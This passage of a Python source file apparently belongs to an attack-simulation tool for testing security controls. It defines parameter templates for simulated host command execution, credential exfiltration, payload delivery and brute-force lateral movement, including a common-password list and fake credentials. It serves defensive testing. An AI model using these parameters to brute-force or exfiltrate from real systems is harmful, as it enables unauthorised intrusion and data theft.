            "id": None,
            "name": "target_command",
            "type": "NOT_CLASSIFIED",
            "source": "PARAM",
            "values": [
                {"id": None, "value": "whoami", "displayValue": "whoami"}
            ],
            "isCustom": True,
            "description": "The command to execute on the target system. Examples: whoami, hostname, ipconfig /all",
            "displayName": "Target Command"
        },
        {
            "id": None,
            "name": "expected_output",
            "type": "NOT_CLASSIFIED",
            "source": "PARAM",
            "values": [
                {"id": None, "value": "", "displayValue": "(any output)"}
            ],
            "isCustom": True,
            "description": "Optional regex pattern to validate in command output. Leave empty to accept any output.",
            "displayName": "Expected Output Pattern"
        }
    ],
    "_metadata": {
        "schema_version": 1
    }
}


EXFILTRATION_PARAMETERS_TEMPLATE = {
    "parameters": [
        {
            "id": None,
            "name": "sensitive_data",
            "type": "NOT_CLASSIFIED",
            "source": "PARAM",
            "values": [
                {
                    "id": None,
                    "value": "username=admin\\npassword=secretP@ss123\\napi_key=sk-1234567890abcdef",
                    "displayValue": "Simulated credentials"
                }
            ],
            "isCustom": True,
            "description": "The sensitive data to exfiltrate. Simulates leaked credentials, PII, or confidential documents.",
            "displayName": "Sensitive Data"
        },
        {
            "id": None,
            "name": "exfil_port",
            "type": "NOT_CLASSIFIED",
            "source": "PARAM",
            "values": [
                {"id": None, "value": "8080", "displayValue": "8080"}
            ],
            "isCustom": True,
            "description": "Port number for the HTTP exfiltration channel. Change to test different port-based filtering.",
            "displayName": "Exfiltration Port"
        }
    ],
    "_metadata": {
        "schema_version": 1
    }
}


INFILTRATION_PARAMETERS_TEMPLATE = {
    "parameters": [
        {
            "id": None,
            "name": "malicious_script",
            "type": "NOT_CLASSIFIED",
            "source": "PARAM",
            "values": [
                {
                    "id": None,
                    "value": "#!/bin/bash\\n# Simulated malicious script\\necho 'Payload executed'\\nwhoami\\nhostname",
                    "displayValue": "Simulated malicious script"
                }
            ],
            "isCustom": True,
            "description": "The malicious payload to deliver to the target. Simulates scripts, malware droppers, or staged payloads.",
            "displayName": "Malicious Script"
        },
        {
            "id": None,
            "name": "infil_port",
            "type": "NOT_CLASSIFIED",
            "source": "PARAM",
            "values": [
                {"id": None, "value": "8080", "displayValue": "8080"}
            ],
            "isCustom": True,
            "description": "Port number for the HTTP payload delivery. Change to test different port-based filtering.",
            "displayName": "Infiltration Port"
        }
    ],
    "_metadata": {
        "schema_version": 1
    }
}


LATERAL_MOVEMENT_PARAMETERS_TEMPLATE = {
    "parameters": [
        {
            "id": None,
            "name": "service_port",
            "type": "NOT_CLASSIFIED",
            "source": "PARAM",
            "values": [
                {"id": None, "value": "8080", "displayValue": "8080"}
            ],
            "isCustom": True,
            "description": "Port for the simulated vulnerable service. Common ports: 22 (SSH), 3389 (RDP), 445 (SMB), 3306 (MySQL).",
            "displayName": "Service Port"
        },
        {
            "id": None,
            "name": "num_attempts",
            "type": "NOT_CLASSIFIED",
            "source": "PARAM",
            "values": [
                {"id": None, "value": "5", "displayValue": "5"}
            ],
            "isCustom": True,
            "description": "Number of authentication attempts the attacker will send. Must match the number of passwords in password_attempts.",
            "displayName": "Number of Attempts"
        },
        {
            "id": None,
            "name": "username",
            "type": "NOT_CLASSIFIED",
            "source": "PARAM",
            "values": [
                {"id": None, "value": "admin", "displayValue": "admin"}
            ],
            "isCustom": True,
            "description": "Username to use in brute force authentication attempts.",
            "displayName": "Target Username"
        },
        {
            "id": None,
            "name": "password_attempts",
            "type": "NOT_CLASSIFIED",
            "source": "PARAM",
            "values": [
                {
                    "id": None,
                    "value": "password,admin,123456,letmein,welcome",
                    "displayValue": "Common passwords"
                }
            ],
            "isCustom": True,
            "description": "Comma-separated list of passwords to try. Add more values to increase brute force attempts.",
            "displayName": "Password List"
        }
    ],
    "_metadata": {
        "schema_version": 1
    }
}


# =============================================================================
# STRING-KEY ACCESSOR MAPS
# =============================================================================

_TARGET_TEMPLATES = {
    "host": HOST_TEMPLATE,
    "exfil": EXFILTRATION_TARGET_TEMPLATE,
    "infil": INFILTRATION_TARGET_TEMPLATE,
    "lateral": LATERAL_MOVEMENT_TARGET_TEMPLATE,
}

_ATTACKER_TEMPLATES = {
    "exfil": EXFILTRATION_ATTACKER_TEMPLATE,
    "infil": INFILTRATION_ATTACKER_TEMPLATE,
    "lateral": LATERAL_MOVEMENT_ATTACKER_TEMPLATE,
}

_PARAMETERS_TEMPLATES = {
    "host": HOST_PARAMETERS_TEMPLATE,
    "exfil": EXFILTRATION_PARAMETERS_TEMPLATE,
    "infil": INFILTRATION_PARAMETERS_TEMPLATE,
    "lateral": LATERAL_MOVEMENT_PARAMETERS_TEMPLATE,
}

_ATTACK_TYPE_DESCRIPTIONS = {
    "host": (
        "Host-level attack that executes entirely on a single machine. "
        "Tests endpoint security controls like process monitoring, command-line logging, "
        "file system protection, and registry monitoring. Single script (target.py only)."
    ),
    "exfil": (
        "Exfiltration attack that simulates sensitive data being stolen from a compromised endpoint. "
        "Tests DLP and network security controls. Data flows from TARGET to ATTACKER. "
        "Dual-script: target.py sends data, attacker.py receives it."
    ),
    "infil": (
        "Infiltration attack that simulates malicious payload delivery to a target machine. "
        "Tests network security controls against incoming payloads (malware downloads, drive-by). "
        "Data flows from ATTACKER to TARGET. Dual-script: attacker.py serves payload, target.py downloads it."
    ),
    "lateral": (
        "Lateral movement attack that simulates an attacker pivoting through a network. "
        "Tests network segmentation and internal security controls. "
        "Unique pattern: TARGET hosts a vulnerable service, ATTACKER exploits it. "
        "Dual-script: target.py runs service, attacker.py sends attack requests."
    ),
}


# =============================================================================
# ACCESSOR FUNCTIONS
# =============================================================================

def get_target_template(attack_type: str) -> str:
    """
    Get the target.py template code for an attack type.

    Args:
        attack_type: Attack type string ("host", "exfil", "infil", "lateral").
                     Unknown types fall back to "host".

    Returns:
        Template code string for target.py
    """
    return _TARGET_TEMPLATES.get(attack_type, HOST_TEMPLATE)


def get_attacker_template(attack_type: str) -> Optional[str]:
    """
    Get the attacker.py template code for a network attack type.

    Args:
        attack_type: Attack type string ("host", "exfil", "infil", "lateral")

    Returns:
        Template code string for attacker.py, or None for host attacks
    """
    return _ATTACKER_TEMPLATES.get(attack_type, None)


def get_parameters_template(attack_type: str) -> dict:
    """
    Get the default parameters template for an attack type (deep copy).

    Args:
        attack_type: Attack type string ("host", "exfil", "infil", "lateral").
                     Unknown types fall back to "host".

    Returns:
        Deep copy of the parameters template dictionary
    """
    template = _PARAMETERS_TEMPLATES.get(attack_type, HOST_PARAMETERS_TEMPLATE)
    return copy.deepcopy(template)


def get_parameters_template_json(attack_type: str) -> str:
    """
    Get the default parameters template as a formatted JSON string.

    Args:
        attack_type: Attack type string ("host", "exfil", "infil", "lateral")

    Returns:
        Formatted JSON string of the parameters template
    """
    params = get_parameters_template(attack_type)
    return json.dumps(params, indent=2)


def get_attack_type_description(attack_type: str) -> str:
    """
    Get a human-readable description of an attack type.

    Args:
        attack_type: Attack type string ("host", "exfil", "infil", "lateral").
                     Unknown types fall back to "host".

    Returns:
        Description string for the attack type
    """
    return _ATTACK_TYPE_DESCRIPTIONS.get(attack_type, _ATTACK_TYPE_DESCRIPTIONS["host"])


def is_dual_script_type(attack_type: str) -> bool:
    """
    Check if an attack type requires both target and attacker scripts.

    Args:
        attack_type: Attack type string ("host", "exfil", "infil", "lateral")

    Returns:
        True if attack type needs both target.py and attacker.py
    """
    return attack_type in _ATTACKER_TEMPLATES
